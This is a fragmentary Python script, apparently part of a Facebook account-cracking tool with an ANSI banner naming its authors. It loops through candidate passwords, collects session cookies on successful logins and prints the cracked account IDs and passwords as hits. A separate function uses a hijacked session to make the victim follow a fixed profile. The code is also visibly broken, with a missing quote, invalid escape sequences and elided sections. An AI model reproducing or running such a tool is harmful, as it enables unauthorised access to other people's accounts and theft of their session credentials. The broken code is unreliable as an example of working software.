...
def follow(self, session, coki):
    r = BeautifulSoup(session.get(https://www.facebook.com/profile.php?id=100028315179402', {
...
\033[1;95m 
\033[1;96m 
\033[1;92m×××××××××××××××××\039[1;93m××××××××××××××\039[1;92m××××××××××××××××××
 \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mAB SHR   \033[1;92m|
 \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34mAB RAZIEQULLAH SAADAT               \033[1;92m|
 \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35mMUMT4Z-SH4H               \033[1;92m|
 \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mFREE-RNDM          \033[1;92m|
 \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mM-S-S                   \033[1;92m|
 \033[1;32m|     \033[1;36m[✓] TOOL VIRSION :  \039[1;36m1.6                   \033[1;92m|
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mSHR-CP ] ' + cid + ' | ' + ps + '  \33[0;97m')
        ...
        loop += 1
        sys.stdout.write(
            '\r%s[SHR] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r' % (H, loop, tl, len(oks), len(cps))),
        sys.stdout.flush()
    except:
        pass
